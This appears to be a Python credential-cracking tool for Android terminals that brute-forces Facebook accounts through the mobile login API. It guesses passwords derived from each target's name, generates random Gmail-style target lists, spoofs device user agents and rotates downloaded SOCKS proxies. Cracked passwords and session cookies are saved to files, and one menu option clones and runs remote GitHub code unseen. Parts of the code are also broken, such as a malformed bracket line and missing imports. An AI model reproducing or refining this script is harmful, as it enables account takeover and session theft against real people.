import os,json,hashlib,io,struct
os.system('clear')


version = "1.0"

'''------Method 1ua----------------'''	
def hstapi1():
	END = "[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=800,height=480};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
	ua = random.choice(['Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))',])+END
	return ua
def us1():
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(100000000, 999999999))
            fbrv = str(random.randint(100000000, 999999999))
            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
            width = random.randint(720, 1440)
            height = random.randint(1080, 2560)
            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
            fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
            fban = random.choice(["FB4A", "FB5A", "FB6A"])
            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
           # ua f"[FBAN/FB4A;FBAV/{fbav};FBBV/480086274;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/Zong;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A-K116C2;FBSV/9;FBBK/0;FBOP/1;FBCA/x86:armeabi-v7a;]"
            [ua = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
        #    print(ua)
	
	
'''------Method 2ua----------------'''	
def us2():
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(100000000, 999999999))
            fbrv = str(random.randint(100000000, 999999999))
            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
            width = random.randint(720, 1440)
            height = random.randint(1080, 2560)
            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
            fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
            fban = random.choice(["FB4A", "FB5A", "FB6A"])
            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
           # ua f"[FBAN/FB4A;FBAV/{fbav};FBBV/480086274;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/Zong;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A-K116C2;FBSV/9;FBBK/0;FBOP/1;FBCA/x86:armeabi-v7a;]"
            ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/{fblc};FBBV/{fbbv};FBCR/{fbcr};FBMF/samsung;FBBD/samsung;FBPN/{fbpn};FBDV//SM-G360F;FBSV/5.0.2;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
          #  print(ua)

'''------Method 3ua----------------'''	
def us3():
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(100000000, 999999999))
            fbrv = str(random.randint(100000000, 999999999))
            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
            width = random.randint(720, 1440)
            height = random.randint(1080, 2560)
            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
            fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
            fban = random.choice(["FB4A", "FB5A", "FB6A"])
            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
           # ua f"[FBAN/FB4A;FBAV/{fbav};FBBV/480086274;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/Zong;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A-K116C2;FBSV/9;FBBK/0;FBOP/1;FBCA/x86:armeabi-v7a;]"
            ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/{fblc};FBBV/{fbbv};FBCR/{fbcr};FBMF/samsung;FBBD/samsung;FBPN/{fbpn};FBDV/SM-G610F;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
         #   print(ua)
	
import os,sys,random,requests,string
from time import time as timex
import requests,os,re,bs4,sys,uuid,json
import time,random,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup
remover = '\x1b[1;0m'
green = '\x1b[1;92m'
red = "\033[1;91m"
orange = '\x1b[38;5;208m'
yal = "\033[1;93m"
whi = "\033[1;97m"
W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'
lin = "------------------------------------"
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor
try:
	open('.prox.txt','w').write(requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text)
except requests.exceptions.ConnectionError:
	exit(' Network Is Very Slow ')
def prox():
    proxies = open('.prox.txt','r').read().splitlines()
    return {'http': 'socks5://'+random.choice(proxies)}

import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)


from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'ar_AR'
try:
	fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
	fbcr = 'Roshan'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
	fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
	total = 0
	for i in fbcr:
		total+=1
	select = ('1','2')
	if select == '1':
		fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
		sim_id+=fbcr
	elif select == '2':
		try:
			fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
			sim_id+=fbcr
		except Exception as e:
			fbcr = "Roshan"
			sim_id+=fbcr
	else:
		fbcr = 'Roahan'
		sim_id+=fbcr
except:
	fbcr = "Roahan"
device = {'android_version':android_version,
'model':model,
'build':build,
'fblc':fblc,
'fbmf':fbmf,
'fbbd':fbbd,
'fbdv':model,
'fbsv':fbsv,
'fbca':fbca,
'fbdm':fbdm}




    


sys.stdout.write('\x1b]2; 𝐇𝐒𝐓\x07')


####@-----Folder-----@####
try:os.mkdir('/sdcard/HST')
except:pass

try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(47*'\033[1;97m-')

def p(x):
	print(x)



id = []
ok = []
cp = []
oks = []
cps = []
loop = 0
method=[]
BRAND = f"{random.choice(['Liger', 'METERED', 'MOBILE.EDGE', 'MOBILE.HSPA', 'MOBILE.LTE', 'MODERATE', 'Fiber', 'DSL', 'Satellite', 'Dial-up', 'Fixed Wireless', 'Cable', 'WiMAX'])}"
ses = requests.Session()

    
def logo():
	os.system('clear')
	logo = (f"""   
\033[1;97m       
_      ____  _      _ 
/ \__/|/__  \/ \  /|/ \
| |\/|||\/  || |\ ||| |
| |  ||\__  || | \||| |
\_/  \|   \_/\_/  \|\_/                                              
\33[1;97m---------------------------------------------------
[>] Owner     : {G} m9ni
{W}[>] Status    :  {G}Paid
{W}[>] Version   :  {G}{version}
\33[1;97m--------------------------------------------------""")
	print(logo)
def clear():
	os.system("clear")
def linex():
    print('\33[1;97m--------------------------------------------------')





nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class iAmMain:
	
	def __init__(self):

		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):
		logo()
		
		
		print(f'[1] File cloning \n[2] Password Changer\n[3] Random Gmail cracking \n[4] Join Watsapp Group \n[0] {R}Exit Menu')
		line()
		opt1 = input('[?] Choose an option: ')
		if opt1 == "1":self.file_menu()
		
		elif opt1 == "2":os.system("cd ~;rm -rf test;git clone --depth=1 https://github.com/Ramxantanha/passchange;cd passchange;python ht.py")
		elif opt1 == "3":gmail()
		elif opt1 == "4":os.system('xdg-open https://chat.whatsapp.com/HbHCryvdxuJ05V88gsLD7f');os.system('python hst.py')
		elif opt1 == "0":exit("")
		else:p("[•] Wrong Select ");sp(2);self.iAmMenu()
	
	
	
	def file_menu(self):
		logo()
		file = input('[?] Put file path\033[1;37m: ')
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p("[•] File Path Incorrect ")
			sp(2);self.file_menu()
		
	def method_select(self,id):
		logo()
		print("[1] Method ")
		print("[2] Method ")
		print("[3] Method ")
		line()
		m_opt = input('[?] Choose: ')
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		elif m_opt =="2":
			method.append('ii')
			self.password_menu(id)
		elif m_opt =="3":
			method.append('iii')
			self.password_menu(id)
		
		else:p("[•] Wrong Select ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		pwx=[]
		logo()
		max = 20	
		try:
			plimit = int(input('[?] Put Password Limit : '))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p("\033[1;97m[\033[1;96m•\033[1;97m] Password Limit Should undet 20 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		for n in range(plimit):
			pwx.append(input("[?] Put password %s : "%(n+1)))
		logo()
		p("[=] Total Ids  : \033[1;32m%s "%(str(len(id))))
		print(f'{W}[=] Please Wait Brute Has Been Started ')
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				
	def saved_results(self,ok,cp):
		p("\033[1;97m")
		line()
		p(" [=] Total OK : %s "%(len(ok)))
		line()
		input("[=] Press Enter To Go Back ")
		self.iAmMenu()

	

	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r\033[1;97m[M1] %s | {green}[OK:%s] {red}[CP:%s] "%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				random_seed = random.Random()
				adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
				data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
				headers={
                                'User-Agent': hstapi1(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					#cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"                                	
					p('\r\033[1;92m[OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/COOKIES.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
	
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r\033[1;97m[M2] %s | {green}[OK:%s] {red}[CP:%s] "%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				random_seed = random.Random()
				adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
				data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
				headers={
                                'User-Agent': us2(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"         
					p('\r\033[1;92m[OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/COOKIES.txt','a').write(uid+'|'+pw+'|'+coki+'\n')					
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method2(uid,nm,pwx)
		except Exception as e:
			self.method2(uid,nm,pwx)
			
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r\033[1;97m[M3] %s | {green}[OK:%s] {red}[CP:%s] "%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				random_seed = random.Random()
				adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
				data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
				headers={
                                'User-Agent': us3(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"         
					p('\r\033[1;92m[OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/COOKIES.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)

def gmail():
                os.system('rm -rf .re.txt')
                logo()
                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tpe(max_workers=30) as saqi:
                        total = str(len(fo))
                        logo()
                        print('Total account : \033[1;32m'+total)
                        print('The process is running in the background ')
                        print('Gmail Cracking started  ')
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                saqi.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python Hst.py')  
def rndm(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\033[1;97m[R] %s | {green}[OK:%s] {red}[CP:%s] "%(loop,len(oks),len(cps)));sys.stdout.flush()
    try:
        for pas in passlist:    
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': us1(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'MOBILE.LTE',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Sisirb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Sisirb};{ckkk}"
                print('\r\r\033[1;32m [OK] '+uid+' | '+pas+'\033[1;97m')
                print(f'\r\r\033[1;31m[\033[1;32mCOOKIE\033[1;31m]{R} {cookie}')
                open('/sdcard/RANDOM-ok.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                oks.append(str(uid))
                break
            elif 'www.facebook.com' in q['error']['message']:
                print(f"\r\r{A}[CP] {uid} | {pas} ")
                open('/sdcard/RANDOM-CP.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                cps.append(uid)
            else:     
                continue
        loop+=1
    except Exception as e:
            pass                     

iAmMain().iAmMenu()    